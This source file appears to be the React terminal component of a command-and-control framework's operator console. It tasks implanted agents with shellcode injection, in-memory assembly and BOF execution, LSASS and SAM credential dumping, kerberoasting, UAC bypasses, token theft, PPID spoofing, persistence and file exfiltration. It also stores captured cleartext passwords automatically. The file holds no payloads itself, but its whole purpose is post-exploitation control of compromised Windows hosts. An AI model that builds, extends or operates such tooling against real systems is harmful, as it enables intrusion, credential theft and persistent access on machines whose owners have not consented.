import { useEffect, useRef, useState, useCallback } from 'react'
import { Terminal as XTerm } from '@xterm/xterm'
import { FitAddon } from '@xterm/addon-fit'
import '@xterm/xterm/css/xterm.css'
import useAgentStore from '../store/useAgentStore'

const COMMANDS = [
  'help', 'h', 'clear', 'savecred',
  'sysinfo', 'ps', 'getpid', 'getuid', 'pwd', 'cd', 'ls', 'mkdir', 'rm', 'cp', 'mv',
  'download', 'upload', 'screenshot', 'shell',
  'reg', 'kill', 'sleep',
  'inject', 'shinject', 'bof', 'execute-assembly',
  'persist', 'socks', 'rportfwd',
  'spawn', 'wmiexec', 'uacbypass', 'lpe_check', 'kerberoast', 'asreproast',
  'steal_token', 'make_token', 'rev2self', 'privs',
  'lsassdump', 'hashdump', 'portscan',
]

const SUBCOMMANDS = {
  persist:   ['install registry', 'install schtask', 'install auto', 'remove registry', 'remove schtask'],
  socks:     ['start', 'stop', 'status'],
  rportfwd:  ['start', 'stop', 'list'],
  reg:       ['query', 'set', 'delete'],
  uacbypass: ['auto', 'runas', 'com', 'eventvwr', 'diskcleanup', 'fodhelper', 'computerdefaults', 'sdclt', 'wsreset'],
  inject:    ['0 thread', '0 hijack', '0 earlybird', '0 stomp'],
  privs:     ['list', 'enable', 'disable'],
  savecred:  ['cleartext', 'hash', 'token', 'kerberos'],
}

function longestCommonPrefix(strs) {
  if (!strs.length) return ''
  let prefix = strs[0]
  for (let i = 1; i < strs.length; i++) {
    while (!strs[i].startsWith(prefix)) prefix = prefix.slice(0, -1)
  }
  return prefix
}

const POLL_MS  = 5000
const POLL_MAX = 60

export default function Terminal({ agent, active = true }) {
  const termRef        = useRef(null)
  const xtermRef       = useRef(null)
  const fitRef         = useRef(null)
  const inputRef       = useRef('')
  const pollRef        = useRef(null)
  const histRef        = useRef([])
  const histIdxRef     = useRef(-1)
  const histDraftRef   = useRef('')
  const injectPidRef    = useRef(0)
  const injectMethodRef = useRef('hijack')
  const injectFileRef   = useRef(null)
  const shinjectFileRef = useRef(null)
  const bofArgsRef      = useRef('')
  const bofFileRef      = useRef(null)
  const execAsmArgsRef  = useRef('')
  const execAsmFileRef  = useRef(null)
  const pendingTaskRef  = useRef(null)
  const pauseScrollRef  = useRef(false)

  const { sendTask, fetchOutput, lastAckedTask, saveCred } = useAgentStore()
  const [status, setStatus] = useState('')

  /* Strip agent task header; suppress all output for screenshot commands */
  const processOutput = useCallback((raw) => {
    if (!raw) return raw
    // Strip agent-prepended header: "[task:uuid] [cmd] rc=N\n"
    const cleaned = raw.replace(/^\[task:[^\]]+\] \[[^\]]+\] rc=-?\d+\r?\n?/, '')
    // Screenshot output: suppress entirely — image is in the Screenshots tab
    if (cleaned.startsWith('[screenshot] ')) return null
    return cleaned
  }, [])

  /* ---- refit + focus when tab becomes visible ---- */
  useEffect(() => {
    if (active && fitRef.current) {
      setTimeout(() => {
        fitRef.current?.fit()
        xtermRef.current?.focus()
      }, 80)
    }
  }, [active])

  /* ---- WS output delivery ---- */
  useEffect(() => {
    if (!lastAckedTask) return
    if (lastAckedTask.agent_id !== agent.agent_id) return
    if (lastAckedTask.task_id !== pendingTaskRef.current) return
    pollRef.current?.()
    pollRef.current = null
    pendingTaskRef.current = null
    const term = xtermRef.current
    if (!term) return
    if (lastAckedTask.output) {
      const display = processOutput(lastAckedTask.output)
      if (display != null) display.split('\n').forEach(l => term.writeln(l))
    } else {
      term.writeln('\x1b[90m(no output)\x1b[0m')
    }
    writePrompt(term, agent.agent_id)
    if (!pauseScrollRef.current) term.scrollToBottom()
    setStatus('')
  }, [lastAckedTask, processOutput])

  /* ---- polling fallback ---- */
  const startPolling = useCallback((taskId) => {
    pollRef.current?.()
    pollRef.current = null
    let attempts = 0
    const id = setInterval(async () => {
      attempts++
      try {
        const data = await fetchOutput(agent.agent_id)
        if (data?.task_id === taskId && data?.status === 'acked') {
          clearInterval(id)
          pollRef.current = null
          pendingTaskRef.current = null
          const term = xtermRef.current
          if (data.output) {
            const display = processOutput(data.output)
            if (display != null) display.split('\n').forEach(l => term.writeln(l))
          } else {
            term.writeln('\x1b[90m(no output)\x1b[0m')
          }
          writePrompt(term, agent.agent_id)
          if (!pauseScrollRef.current) term.scrollToBottom()
          setStatus('')
        }
      } catch {}
      if (attempts > POLL_MAX) {
        clearInterval(id)
        pollRef.current = null
        pendingTaskRef.current = null
        xtermRef.current?.writeln('\x1b[31m[TIMEOUT] no response\x1b[0m')
        writePrompt(xtermRef.current, agent.agent_id)
        setStatus('')
      }
    }, POLL_MS)
    pollRef.current = () => clearInterval(id)
  }, [agent.agent_id, fetchOutput, processOutput])

  /* ---- command dispatch ---- */
  const handleCommand = useCallback(async (line) => {
    const term = xtermRef.current
    if (!term) return
    const parts = line.trim().split(/\s+/)
    const cmd   = parts[0]
    const rest  = parts.slice(1)

    if (cmd === 'help' || cmd === 'h') {
      term.writeln('\x1b[35m// RECON //\x1b[0m')
      term.writeln('  \x1b[36msysinfo\x1b[0m                                OS, hostname, user, arch, privileges')
      term.writeln('  \x1b[36mps\x1b[0m                                     list processes (PID/PPID/arch/integrity)')
      term.writeln('  \x1b[36mgetuid\x1b[0m                                 current identity + integrity level')
      term.writeln('  \x1b[36mgetpid\x1b[0m                                 current PID')
      term.writeln('  \x1b[36mpwd\x1b[0m                                    current working directory')
      term.writeln('  \x1b[36mcd <path>\x1b[0m                             change working directory')
      term.writeln('\x1b[35m// FILESYSTEM //\x1b[0m')
      term.writeln('  \x1b[36mls [path]\x1b[0m                             list directory')
      term.writeln('  \x1b[36mmkdir <path>\x1b[0m                          create directory')
      term.writeln('  \x1b[36mrm <path>\x1b[0m                             delete file or empty directory')
      term.writeln('  \x1b[36mcp <src> <dst>\x1b[0m                        copy file')
      term.writeln('  \x1b[36mmv <src> <dst>\x1b[0m                        move/rename file or directory')
      term.writeln('  \x1b[36mdownload <path>\x1b[0m                       exfil file')
      term.writeln('  \x1b[36mupload <path> <b64>\x1b[0m                   push file')
      term.writeln('  \x1b[36mscreenshot\x1b[0m                            capture primary monitor')
      term.writeln('\x1b[35m// REGISTRY //\x1b[0m')
      term.writeln('  \x1b[36mreg query <key> [val]\x1b[0m                 query registry key or value')
      term.writeln('  \x1b[36mreg set <key> <val> <type> <data>\x1b[0m    set value (REG_SZ/DWORD/BINARY)')
      term.writeln('  \x1b[36mreg delete <key> [val]\x1b[0m               delete value or empty key')
      term.writeln('\x1b[35m// EXECUTION //\x1b[0m')
      term.writeln('  \x1b[36mshell <cmd>\x1b[0m                          run via CreateProcess')
      term.writeln('  \x1b[36mbof [args]\x1b[0m                            execute COFF BOF (file picker)')
      term.writeln('  \x1b[36mexecute-assembly [args]\x1b[0m              run .NET assembly in-memory (file picker)')
      term.writeln('  \x1b[36mspawn <exe> <fakeargs> [realargs]\x1b[0m    spawn with arg + PPID spoofing')
      term.writeln('\x1b[35m// INJECTION //\x1b[0m')
      term.writeln('  \x1b[36minject [pid] [hijack|thread|earlybird|stomp]\x1b[0m  inject shellcode (0=auto)')
      term.writeln('  \x1b[36mshinject\x1b[0m                             inject shellcode in current process')
      term.writeln('\x1b[35m// CRED ACCESS //\x1b[0m')
      term.writeln('  \x1b[36mlsassdump [path]\x1b[0m                      dump LSASS memory')
      term.writeln('  \x1b[36mhashdump [dir]\x1b[0m                        save SAM/SYSTEM/SECURITY hives')
      term.writeln('\x1b[35m// LATERAL / PRIV //\x1b[0m')
      term.writeln('  \x1b[36mwmiexec <host> <cmd>\x1b[0m                  exec via WMI Win32_Process::Create (blind — no output)')
      term.writeln('  \x1b[36muacbypass [method] [cmd]\x1b[0m              UAC bypass → User→SYSTEM via lifter')
      term.writeln('  \x1b[36m  auto\x1b[0m                                try all methods in order')
      term.writeln('  \x1b[36m  com\x1b[0m                                 ICMLuaUtil elevation moniker (silent, best on default UAC)')
      term.writeln('  \x1b[33m  ⚠  eventvwr|fodhelper|computerdefaults   [WIP] HKCU class hijack — unreliable on Win11 26200\x1b[0m')
      term.writeln('  \x1b[33m  ⚠  sdclt|wsreset|diskcleanup             [WIP] alt hijacks — unreliable on Win11 26200\x1b[0m')
      term.writeln('  \x1b[36m  runas\x1b[0m                               shows UAC prompt — requires user approval')
      term.writeln('  \x1b[36mlpe_check\x1b[0m                             enumerate local privesc vectors')
      term.writeln('  \x1b[36msteal_token <pid>\x1b[0m                     impersonate primary token of pid')
      term.writeln('  \x1b[36mmake_token <DOM\\user> <pass>\x1b[0m         logon + impersonate (runas /netonly)')
      term.writeln('  \x1b[36mrev2self\x1b[0m                              revert to original token')
      term.writeln('  \x1b[36mprivs [list|enable|disable] [name]\x1b[0m   manage token privileges')
      term.writeln('  \x1b[36mkill <pid>\x1b[0m                            terminate process')
      term.writeln('\x1b[35m// KERBEROS //\x1b[0m')
      term.writeln('  \x1b[36mkerberoast [aes]\x1b[0m                      TGS ticket harvest → hashcat $krb5tgs$')
      term.writeln('  \x1b[36masreproast\x1b[0m                            AS-REP harvest → hashcat $krb5asrep$')
      term.writeln('\x1b[35m// PERSISTENCE //\x1b[0m')
      term.writeln('  \x1b[36mpersist install registry|schtask|auto\x1b[0m install persistence')
      term.writeln('  \x1b[36mpersist remove registry|schtask\x1b[0m      remove persistence')
      term.writeln('\x1b[35m// EVASION //\x1b[0m')
      term.writeln('  \x1b[36msleep <ms>\x1b[0m                            obfuscated sleep')
      term.writeln('\x1b[35m// NETWORK //\x1b[0m')
      term.writeln('  \x1b[36mportscan <host> <start>-<end> [ms]\x1b[0m   TCP port scan')
      term.writeln('  \x1b[36msocks start <port>\x1b[0m                    start SOCKS5 listener')
      term.writeln('  \x1b[36msocks stop | status\x1b[0m                   stop / check SOCKS5')
      term.writeln('  \x1b[36mrportfwd start <lport> <rhost> <rport>\x1b[0m bind + relay')
      term.writeln('  \x1b[36mrportfwd stop <lport> | list\x1b[0m         stop / list forwards')
      term.writeln('\x1b[35m// CREDS STORE //\x1b[0m')
      term.writeln('  \x1b[36msavecred <type> <user> <secret> [host]\x1b[0m save to cred store')
      term.writeln('  \x1b[36m  types: cleartext hash token kerberos\x1b[0m')
      term.writeln('\x1b[35m// META //\x1b[0m')
      term.writeln('  \x1b[36mclear\x1b[0m                                 clear terminal')
      term.writeln('  \x1b[36mhelp | h\x1b[0m                              this menu')
      writePrompt(term, agent.agent_id)
      return
    }
    if (cmd === 'clear') {
      term.write('\x1b[2J\x1b[H')
      writePrompt(term, agent.agent_id)
      return
    }
    if (cmd === 'savecred') {
      // savecred <type> <user> <secret> [host]
      // type: cleartext | hash | token | kerberos
      const [type, user, secret, ...hostParts] = rest
      if (!type || !user) {
        term.writeln('\x1b[31m[savecred] usage: savecred <type> <user> <secret> [host]\x1b[0m')
        term.writeln('\x1b[90m          types: cleartext hash token kerberos\x1b[0m')
        writePrompt(term, agent.agent_id)
        return
      }
      const result = await saveCred({
        agent_id:  agent.agent_id,
        cred_type: type,
        username:  user,
        secret:    secret || '',
        host:      hostParts.join(' '),
      })
      if (result) {
        term.writeln(`\x1b[32m[savecred] saved: ${type} / ${user}\x1b[0m`)
      } else {
        term.writeln('\x1b[31m[savecred] failed to save\x1b[0m')
      }
      writePrompt(term, agent.agent_id)
      return
    }
    if (cmd === 'inject') {
      injectPidRef.current    = parseInt(rest[0] || '0', 10)
      injectMethodRef.current = rest[1] || 'hijack'
      term.writeln('\x1b[90m[→ inject] select .bin shellcode file...\x1b[0m')
      injectFileRef.current?.click()
      return
    }
    if (cmd === 'shinject') {
      term.writeln('\x1b[90m[→ shinject] select .bin shellcode file...\x1b[0m')
      shinjectFileRef.current?.click()
      return
    }
    if (cmd === 'bof') {
      bofArgsRef.current = rest[0] || ''
      term.writeln('\x1b[90m[→ bof] select .o COFF file...\x1b[0m')
      bofFileRef.current?.click()
      return
    }
    if (cmd === 'execute-assembly') {
      execAsmArgsRef.current = rest.join(' ')
      term.writeln('\x1b[90m[→ execute-assembly] select .exe .NET assembly...\x1b[0m')
      execAsmFileRef.current?.click()
      return
    }

    let taskCmd  = 'shell'
    let taskArgs = line   // default: whole line as shell cmd
    let taskData = ''

    if (cmd === 'shell') {
      if (!rest.length) {
        term.writeln('\x1b[31m[shell] usage: shell <command>\x1b[0m')
        writePrompt(term, agent.agent_id)
        return
      }
      taskCmd  = 'shell'
      taskArgs = rest.join(' ')
    }
    else if (cmd === 'sysinfo')       { taskCmd = 'sysinfo';      taskArgs = '' }
    else if (cmd === 'ps')            { taskCmd = 'ps';           taskArgs = '' }
    else if (cmd === 'pwd')           { taskCmd = 'pwd';          taskArgs = '' }
    else if (cmd === 'cd')            { taskCmd = 'cd';           taskArgs = rest.join(' ') }
    else if (cmd === 'ls')            { taskCmd = 'ls';           taskArgs = rest.join(' ') || '.' }
    else if (cmd === 'mkdir')         { taskCmd = 'mkdir';        taskArgs = rest.join(' ') }
    else if (cmd === 'rm')            { taskCmd = 'rm';           taskArgs = rest.join(' ') }
    else if (cmd === 'cp')            { taskCmd = 'cp';           taskArgs = rest.join(' ') }
    else if (cmd === 'mv')            { taskCmd = 'mv';           taskArgs = rest.join(' ') }
    else if (cmd === 'reg')           { taskCmd = 'reg';          taskArgs = rest.join(' ') }
    else if (cmd === 'kill')          { taskCmd = 'kill';         taskArgs = rest[0] || '0' }
    else if (cmd === 'sleep')         { taskCmd = 'sleep';        taskArgs = rest[0] || '1000' }
    else if (cmd === 'download')      { taskCmd = 'download';     taskArgs = rest.join(' ') }
    else if (cmd === 'upload')        { taskCmd = 'upload';       taskArgs = rest[0] || ''; taskData = rest[1] || '' }
    else if (cmd === 'persist')       { taskCmd = 'persist';      taskArgs = rest.join(' ') }
    else if (cmd === 'socks')         { taskCmd = 'socks';        taskArgs = rest.join(' ') || 'status' }
    else if (cmd === 'rportfwd')      { taskCmd = 'rportfwd';     taskArgs = rest.join(' ') }
    else if (cmd === 'screenshot')    { taskCmd = 'screenshot';   taskArgs = '' }
    else if (cmd === 'getpid')        { taskCmd = 'getpid';       taskArgs = rest[0] || '' }
    else if (cmd === 'getuid')        { taskCmd = 'getuid';       taskArgs = '' }
    else if (cmd === 'rev2self')      { taskCmd = 'rev2self';     taskArgs = '' }
    else if (cmd === 'steal_token')   { taskCmd = 'steal_token';  taskArgs = rest[0] || '0' }
    else if (cmd === 'make_token')    { taskCmd = 'make_token';   taskArgs = rest.join(' ') }
    else if (cmd === 'privs')         { taskCmd = 'privs';        taskArgs = rest.join(' ') || 'list' }
    else if (cmd === 'spawn')         { taskCmd = 'spawn';        taskArgs = rest.join(' ') }
    else if (cmd === 'wmiexec')       { taskCmd = 'wmiexec';      taskArgs = rest.join(' ') }
    else if (cmd === 'privesc')        { taskCmd = 'privesc';      taskArgs = '' }
    else if (cmd === 'uacbypass')     { taskCmd = 'uacbypass';    taskArgs = rest.join(' ') }
    else if (cmd === 'getsystem')     { taskCmd = 'getsystem';    taskArgs = '' }
    else if (cmd === 'lpe_check')     { taskCmd = 'lpe_check';    taskArgs = '' }
    else if (cmd === 'kerberoast')    { taskCmd = 'kerberoast';   taskArgs = rest[0] || '' }
    else if (cmd === 'asreproast')    { taskCmd = 'asreproast';   taskArgs = '' }
    else if (cmd === 'lsassdump')     { taskCmd = 'lsassdump';    taskArgs = rest[0] || '' }
    else if (cmd === 'hashdump')      { taskCmd = 'hashdump';     taskArgs = rest[0] || '' }
    else if (cmd === 'portscan')      { taskCmd = 'portscan';     taskArgs = rest.join(' ') }

    /* auto-save make_token creds */
    if (taskCmd === 'make_token' && rest.length >= 2) {
      const [domainUser, pass] = rest
      saveCred({ agent_id: agent.agent_id, cred_type: 'cleartext', username: domainUser, secret: pass })
        .catch(() => {})
    }

    setStatus('WAITING FOR AGENT...')
    const task = await sendTask(agent.agent_id, taskCmd, taskArgs, taskData)
    if (!task) {
      term.writeln('\x1b[31m[ERR] task queue failed\x1b[0m')
      writePrompt(term, agent.agent_id)
      setStatus('')
      return
    }
    pendingTaskRef.current = task.task_id
    if (!useAgentStore.getState().wsConnected) {
      startPolling(task.task_id)
    } else {
      const id = setTimeout(() => {
        if (pendingTaskRef.current === task.task_id) startPolling(task.task_id)
      }, 30000)
      pollRef.current = () => clearTimeout(id)
    }
  }, [agent.agent_id, sendTask, startPolling])

  /* ---- inject file handler ---- */
  const handleInjectFile = useCallback(async (e) => {
    const file = e.target.files[0]
    if (!file) return
    e.target.value = ''
    const term = xtermRef.current

    const reader = new FileReader()
    reader.onload = async () => {
      const bytes  = new Uint8Array(reader.result)
      let binary = ''
      for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i])
      const b64 = btoa(binary)

      const method = injectMethodRef.current
      term.writeln(`\x1b[90m[→ inject] pid=${injectPidRef.current} method=${method} size=${bytes.length}B\x1b[0m`)
      setStatus('WAITING FOR AGENT...')

      const task = await sendTask(
        agent.agent_id, 'inject', `${injectPidRef.current} ${method}`, b64
      )
      if (!task) {
        term.writeln('\x1b[31m[ERR] task queue failed\x1b[0m')
        writePrompt(term, agent.agent_id)
        setStatus('')
        return
      }
      pendingTaskRef.current = task.task_id
      if (!useAgentStore.getState().wsConnected) {
        startPolling(task.task_id)
      } else {
        const id = setTimeout(() => {
          if (pendingTaskRef.current === task.task_id) startPolling(task.task_id)
        }, 30000)
        pollRef.current = () => clearTimeout(id)
      }
    }
    reader.readAsArrayBuffer(file)
  }, [agent.agent_id, sendTask, startPolling])

  /* ---- shinject file handler ---- */
  const handleShinjectFile = useCallback(async (e) => {
    const file = e.target.files[0]
    if (!file) return
    e.target.value = ''
    const term = xtermRef.current

    const reader = new FileReader()
    reader.onload = async () => {
      const bytes  = new Uint8Array(reader.result)
      let binary = ''
      for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i])
      const b64 = btoa(binary)

      term.writeln(`\x1b[90m[→ shinject] ${file.name} ${bytes.length}B\x1b[0m`)
      setStatus('WAITING FOR AGENT...')

      const task = await sendTask(agent.agent_id, 'shinject', '', b64)
      if (!task) {
        term.writeln('\x1b[31m[ERR] task queue failed\x1b[0m')
        writePrompt(term, agent.agent_id)
        setStatus('')
        return
      }
      pendingTaskRef.current = task.task_id
      if (!useAgentStore.getState().wsConnected) {
        startPolling(task.task_id)
      } else {
        const id = setTimeout(() => {
          if (pendingTaskRef.current === task.task_id) startPolling(task.task_id)
        }, 30000)
        pollRef.current = () => clearTimeout(id)
      }
    }
    reader.readAsArrayBuffer(file)
  }, [agent.agent_id, sendTask, startPolling])

  /* ---- BOF file handler ---- */
  const handleBofFile = useCallback(async (e) => {
    const file = e.target.files[0]
    if (!file) return
    e.target.value = ''
    const term = xtermRef.current

    const reader = new FileReader()
    reader.onload = async () => {
      const bytes = new Uint8Array(reader.result)
      let binary = ''
      for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i])
      const b64coff = btoa(binary)

      term.writeln(`\x1b[90m[→ bof] ${file.name} ${bytes.length}B\x1b[0m`)
      setStatus('WAITING FOR AGENT...')

      const task = await sendTask(
        agent.agent_id, 'bof', bofArgsRef.current, b64coff
      )
      if (!task) {
        term.writeln('\x1b[31m[ERR] task queue failed\x1b[0m')
        writePrompt(term, agent.agent_id)
        setStatus('')
        return
      }
      pendingTaskRef.current = task.task_id
      if (!useAgentStore.getState().wsConnected) {
        startPolling(task.task_id)
      } else {
        const id = setTimeout(() => {
          if (pendingTaskRef.current === task.task_id) startPolling(task.task_id)
        }, 30000)
        pollRef.current = () => clearTimeout(id)
      }
    }
    reader.readAsArrayBuffer(file)
  }, [agent.agent_id, sendTask, startPolling])

  /* ---- execute-assembly file handler ---- */
  const handleExecAsmFile = useCallback(async (e) => {
    const file = e.target.files[0]
    if (!file) return
    e.target.value = ''
    const term = xtermRef.current

    const reader = new FileReader()
    reader.onload = async () => {
      const bytes = new Uint8Array(reader.result)
      let binary = ''
      for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i])
      const b64 = btoa(binary)

      const args = execAsmArgsRef.current
      term.writeln(`\x1b[90m[→ execute-assembly] ${file.name} ${bytes.length}B${args ? ' args: ' + args : ''}\x1b[0m`)
      setStatus('WAITING FOR AGENT...')

      const task = await sendTask(agent.agent_id, 'execute-assembly', args, b64)
      if (!task) {
        term.writeln('\x1b[31m[ERR] task queue failed\x1b[0m')
        writePrompt(term, agent.agent_id)
        setStatus('')
        return
      }
      pendingTaskRef.current = task.task_id
      if (!useAgentStore.getState().wsConnected) {
        startPolling(task.task_id)
      } else {
        const id = setTimeout(() => {
          if (pendingTaskRef.current === task.task_id) startPolling(task.task_id)
        }, 30000)
        pollRef.current = () => clearTimeout(id)
      }
    }
    reader.readAsArrayBuffer(file)
  }, [agent.agent_id, sendTask, startPolling])

  /* ---- xterm setup ---- */
  useEffect(() => {
    const term = new XTerm({
      theme: {
        background:          '#0a0a0a',
        foreground:          '#c0c0c0',
        cursor:              '#ff3131',
        cursorAccent:        '#0a0a0a',
        black:               '#1a1a1a',
        brightBlack:         '#333',
        green:               '#22c55e',
        brightGreen:         '#4ade80',
        cyan:                '#00ffff',
        brightCyan:          '#67e8f9',
        red:                 '#e8173a',
        brightRed:           '#f87171',
        magenta:             '#ff3131',
        brightMagenta:       '#f472b6',
        yellow:              '#f59e0b',
        white:               '#e0e0e0',
        brightWhite:         '#ffffff',
        selectionBackground: '#ff313122',
      },
      fontFamily:  "'Share Tech Mono', Consolas, monospace",
      fontSize:    13,
      lineHeight:  1.5,
      cursorBlink: true,
      cursorStyle: 'block',
      scrollback:  5000,
    })

    /* Restore per-agent history from localStorage */
    try {
      const saved = localStorage.getItem('h_' + agent.agent_id)
      if (saved) histRef.current = JSON.parse(saved)
    } catch {}

    const fit = new FitAddon()
    term.loadAddon(fit)
    term.open(termRef.current)
    fit.fit()
    xtermRef.current = term
    fitRef.current   = fit

    /* Auto-scroll pause: detect user scroll up */
    term.onScroll(() => {
      const buf     = term.buffer.active
      const atBottom = buf.viewportY >= buf.length - term.rows
      pauseScrollRef.current = !atBottom
    })

    term.writeln('')
    writePrompt(term, agent.agent_id)

    /* Prevent browser from stealing Tab (focus change) */
    term.attachCustomKeyEventHandler((e) => {
      if (e.key === 'Tab') { e.preventDefault(); return true }
      return true
    })

    term.onKey(({ key, domEvent }) => {
      const code = domEvent.keyCode

      if (code === 13) {
        /* Enter */
        const line = inputRef.current.trim()
        term.writeln('')
        inputRef.current   = ''
        histIdxRef.current = -1
        histDraftRef.current = ''
        if (line) {
          histRef.current.unshift(line)
          if (histRef.current.length > 200) histRef.current.pop()
          try { localStorage.setItem('h_' + agent.agent_id, JSON.stringify(histRef.current)) } catch {}
          handleCommand(line)
        } else {
          writePrompt(term, agent.agent_id)
        }

      } else if (code === 9) {
        /* Tab — autocomplete */
        const input = inputRef.current
        const parts = input.trimStart().split(/\s+/)
        const cmd   = parts[0]

        if (parts.length <= 1) {
          /* completing command name */
          const matches = COMMANDS.filter(c => c.startsWith(cmd))
          if (matches.length === 1) {
            replaceInput(term, matches[0] + ' ')
          } else if (matches.length > 1) {
            const common = longestCommonPrefix(matches)
            if (common.length > cmd.length) {
              replaceInput(term, common)
            } else {
              term.writeln('')
              term.writeln('\x1b[90m' + matches.join('   ') + '\x1b[0m')
              writePrompt(term, agent.agent_id)
              term.write(input)
            }
          }
        } else {
          /* completing sub-argument */
          const subs = SUBCOMMANDS[cmd]
          if (subs) {
            const typedArgs = parts.slice(1).join(' ')
            const matches   = subs.filter(s => s.startsWith(typedArgs))
            if (matches.length === 1) {
              replaceInput(term, cmd + ' ' + matches[0] + ' ')
            } else if (matches.length > 1) {
              const common = longestCommonPrefix(matches)
              if (common.length > typedArgs.length) {
                replaceInput(term, cmd + ' ' + common)
              } else {
                term.writeln('')
                term.writeln('\x1b[90m' + matches.join('   ') + '\x1b[0m')
                writePrompt(term, agent.agent_id)
                term.write(input)
              }
            }
          }
        }

      } else if (code === 8) {
        /* Backspace */
        if (inputRef.current.length > 0) {
          inputRef.current = inputRef.current.slice(0, -1)
          term.write('\b \b')
        }

      } else if (code === 38) {
        /* Arrow Up — history back */
        if (!histRef.current.length) return
        if (histIdxRef.current === -1) histDraftRef.current = inputRef.current
        histIdxRef.current = Math.min(histIdxRef.current + 1, histRef.current.length - 1)
        replaceInput(term, histRef.current[histIdxRef.current])

      } else if (code === 40) {
        /* Arrow Down — history forward */
        if (histIdxRef.current === -1) return
        histIdxRef.current--
        const entry = histIdxRef.current >= 0
          ? histRef.current[histIdxRef.current]
          : histDraftRef.current
        replaceInput(term, entry)

      } else if (key.charCodeAt(0) >= 32) {
        /* Printable — typing resets history nav */
        histIdxRef.current   = -1
        histDraftRef.current = ''
        inputRef.current += key
        term.write(key)
      }
    })

    const observer = new ResizeObserver(() => fit.fit())
    observer.observe(termRef.current)

    return () => {
      observer.disconnect()
      pollRef.current?.()
      term.dispose()
    }
  }, [agent.agent_id, handleCommand])

  /* helper: clear current xterm input line and write new value */
  function replaceInput(term, value) {
    const cur = inputRef.current
    if (cur.length) term.write('\b \b'.repeat(cur.length))
    term.write(value)
    inputRef.current = value
  }

  return (
    <div style={styles.wrapper}>
      <input
        type="file"
        ref={injectFileRef}
        style={{ display: 'none' }}
        onChange={handleInjectFile}
      />
      <input
        type="file"
        ref={shinjectFileRef}
        style={{ display: 'none' }}
        onChange={handleShinjectFile}
      />
      <input
        type="file"
        accept=".o"
        ref={bofFileRef}
        style={{ display: 'none' }}
        onChange={handleBofFile}
      />
      <input
        type="file"
        accept=".exe,.dll"
        ref={execAsmFileRef}
        style={{ display: 'none' }}
        onChange={handleExecAsmFile}
      />
      <div ref={termRef} style={styles.termContainer}
           tabIndex={0}
           onClick={() => xtermRef.current?.focus()}
           onFocus={() => xtermRef.current?.focus()} />
    </div>
  )
}

function writePrompt(term, agentId) {
  term.write(`\x1b[35m${agentId}\x1b[0m\x1b[90m >\x1b[0m `)
}

const styles = {
  wrapper: {
    display: 'flex', flexDirection: 'column',
    height: '100%', background: '#0a0a0a', overflow: 'hidden',
  },
  topbar: {
    display: 'flex', alignItems: 'center', gap: 10,
    padding: '6px 14px', borderBottom: '1px solid #1a1a1a',
    background: '#0d0d0d', flexShrink: 0,
  },
  agentLabel: {
    fontFamily: "'Share Tech Mono', monospace",
    fontSize: 12, color: '#ff3131', letterSpacing: 1,
  },
  sep:      { color: '#2a2a2a', fontSize: 11 },
  hostname: {
    fontSize: 11, color: '#4a4a4a', flex: 1,
    fontFamily: "'Share Tech Mono', monospace", letterSpacing: 1,
  },
  status: {
    display: 'flex', alignItems: 'center',
    fontSize: 10, color: '#f59e0b', letterSpacing: 2,
    fontFamily: "'Share Tech Mono', monospace",
  },
  termContainer: { flex: 1, padding: 8, overflow: 'hidden' },
  ssPanel: {
    flexShrink: 0, background: '#0d0d0d',
    borderBottom: '1px solid #1a1a1a',
  },
  ssBar: {
    display: 'flex', alignItems: 'center', justifyContent: 'space-between',
    padding: '4px 10px', borderBottom: '1px solid #1a1a1a',
  },
  ssLabel: {
    fontFamily: "'Share Tech Mono', monospace",
    fontSize: 10, color: '#ff3131', letterSpacing: 2,
  },
  ssClose: {
    background: 'none', border: 'none', color: '#4a4a4a',
    cursor: 'pointer', fontSize: 12, padding: '0 4px',
    fontFamily: "'Share Tech Mono', monospace",
  },
  ssImg: {
    display: 'block', margin: '6px auto 6px',
    maxWidth: '100%', imageRendering: 'pixelated',
    border: '1px solid #1a1a1a',
  },
}
